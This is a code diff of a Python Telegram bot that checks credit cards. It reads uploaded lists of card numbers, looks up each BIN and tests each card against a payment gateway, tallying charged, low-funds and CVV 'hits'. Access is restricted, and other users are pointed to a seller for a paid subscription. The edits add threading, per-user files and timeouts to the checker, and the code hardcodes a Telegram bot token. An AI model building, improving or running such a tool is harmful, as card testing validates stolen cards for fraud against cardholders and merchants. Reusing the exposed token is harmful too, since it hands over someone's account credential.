@@ -1,29 +1,25 @@
 import requests
-import telebot, time
+import telebot, time, threading
 from telebot import types
 from gatet import Tele
 import os
+from func_timeout import func_timeout, FunctionTimedOut
 
 token = '8406430794:AAE2yHzMNiolhVjFclHkBgnL6Bnvv0bgTAA'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 
 # ==========================================
-# 👇 ALLOWED_IDS (အပိုနေရာလွတ် ၄ ခု လုပ်ပေးထားတယ်)
-# နောက်မှ ID ထည့်ချင်ရင် 'ID_x_HERE' နေရာမှာ ဂဏန်းအစားထိုးလိုက်ပါ
-# မျက်တောင် '...' တွေနဲ့ ကော်မာ , တွေကို မဖျက်မိပါစေနဲ့
-
+# 👇 ALLOWED USERS LIST
 ALLOWED_IDS = [
-    '1915369904',    # မင်းရဲ့ ID (Owner)
-    '7745508838',     # သူငယ်ချင်း (၁) အတွက် နေရာလွတ်
-    '6815134572',     # သူငယ်ချင်း (၂) အတွက် နေရာလွတ်
-    '1163809291',     # သူငယ်ချင်း (၃) အတွက် နေရာလွတ်
-    'ID_5_HERE'      # သူငယ်ချင်း (၄) အတွက် နေရာလွတ်
-] 
+    '1915369904',    # Owner
+    '1282351506',     # User 2
+    '7745508838',     # User 3
+    '6815134572'      # User 4
+]
 # ==========================================
 
 @bot.message_handler(commands=["start"])
 def start(message):
-    # List ထဲမှာမပါရင် (not in) ပေးမသုံးဘူး
     if str(message.chat.id) not in ALLOWED_IDS:
         bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
         return
@@ -34,7 +30,12 @@ def main(message):
     if str(message.chat.id) not in ALLOWED_IDS:
         bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus")
         return
-    
+
+    # Threading စတင်ခြင်း
+    t = threading.Thread(target=run_checker, args=(message,))
+    t.start()
+
+def run_checker(message):
     dd = 0
     live = 0
     ch = 0
@@ -42,14 +43,22 @@ def main(message):
     cvv = 0
     lowfund = 0
     
-    ko = bot.reply_to(message, "𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐍𝐨𝐰! ❤️").message_id
-    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
+    chat_id = message.chat.id
     
-    with open("combo.txt", "wb") as w:
-        w.write(ee)
-        
+    # 🔥 NAME CONFLICT FIX 🔥
+    # ID ရော Time ပါထည့်လိုက်တဲ့အတွက် ဘယ်လိုမှ နာမည်မတူနိုင်တော့ဘူး
+    # combo_ID_TIME.txt (ဥပမာ: combo_191536_1712345.txt)
+    file_name = f"combo_{chat_id}_{int(time.time())}.txt"
+    stop_file = f"stop_{chat_id}.stop"
+
     try:
-        with open("combo.txt", 'r') as file:
+        ko = bot.reply_to(message, "𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐍𝐨𝐰! 🚀").message_id
+        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
+        
+        with open(file_name, "wb") as w:
+            w.write(ee)
+            
+        with open(file_name, 'r') as file:
             lino = file.readlines()
             total = len(lino)
             
@@ -57,9 +66,10 @@ def main(message):
                 cc = cc.strip()
                 
                 # ===== STOP CHECK =====
-                if os.path.exists("stop.stop"):
-                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝑺𝑻𝑶𝑷 ✅\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus')
-                    os.remove('stop.stop')
+                if os.path.exists(stop_file):
+                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text='𝑺𝑻𝑶𝑷 ✅\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus')
+                    os.remove(stop_file)
+                    if os.path.exists(file_name): os.remove(file_name)
                     return
                 
                 # ===== BIN LOOKUP =====
@@ -75,11 +85,16 @@ def main(message):
                 bank = data.get('bank', 'Unknown')
                 
                 start_time = time.time()
+                
+                # ===== CHECKER WITH TIMEOUT =====
                 try:
-                    last = str(Tele(cc))
+                    # 25 seconds timeout to prevent freeze
+                    last = str(func_timeout(25, Tele, args=(cc,)))
+                except FunctionTimedOut:
+                    last = 'Gateway Time Out ❌'
                 except Exception as e:
                     print(e)
-                    last = 'missing payment form'
+                    last = 'Error'
                 
                 end_time = time.time()
                 execution_time = end_time - start_time
@@ -105,14 +120,14 @@ def main(message):
                 markup = types.InlineKeyboardMarkup(row_width=1)
                 markup.add(types.InlineKeyboardButton("⛔ sᴛᴏᴘ ⚠️", callback_data="stop"))
                 
-                # 🔥 Message Edit Limit Logic 🔥
+                # Logic: Hit မိရင် (သို့) Decline ၁၅ ခုပြည့်ရင် Edit မယ်
                 is_hit = 'Payment Successful' in last or 'funds' in last or 'security code' in last
                 
                 if is_hit or (dd % 15 == 0):
-                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=view_text, reply_markup=markup)
+                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                 
-                # ===== LOGIC & HIT SENDER =====
-                print(f"{cc} -> {last}")
+                # ===== HIT SENDER =====
+                print(f"{chat_id} : {cc} -> {last}")
                 
                 if 'Payment Successful' in last:
                     ch += 1
@@ -133,7 +148,7 @@ def main(message):
                                     
                 elif 'security code is incorrect' in last or 'security code is invalid' in last:
                     ccn += 1
-                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=view_text, reply_markup=markup)
+                    bot.edit_message_text(chat_id=chat_id, message_id=ko, text=view_text, reply_markup=markup)
                     
                 elif 'funds' in last:
                     lowfund += 1
@@ -166,15 +181,18 @@ def main(message):
                 else:
                     dd += 1
                     time.sleep(1)
-                    
+        
+        # Cleanup
+        if os.path.exists(file_name): os.remove(file_name)
+        bot.edit_message_text(chat_id=chat_id, message_id=ko, text='𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝑫𝒐𝒏𝒆!\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus')
+
     except Exception as e:
-        print(e)
-    
-    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝑫𝒐𝒏𝒆!\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus')
+        print(f"Error for {chat_id}: {e}")
 
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
 def menu_callback(call):
-    with open("stop.stop", "w") as file:
+    stop_file = f"stop_{call.message.chat.id}.stop"
+    with open(stop_file, "w") as file:
         pass
     bot.answer_callback_query(call.id, "Stopping...")
 
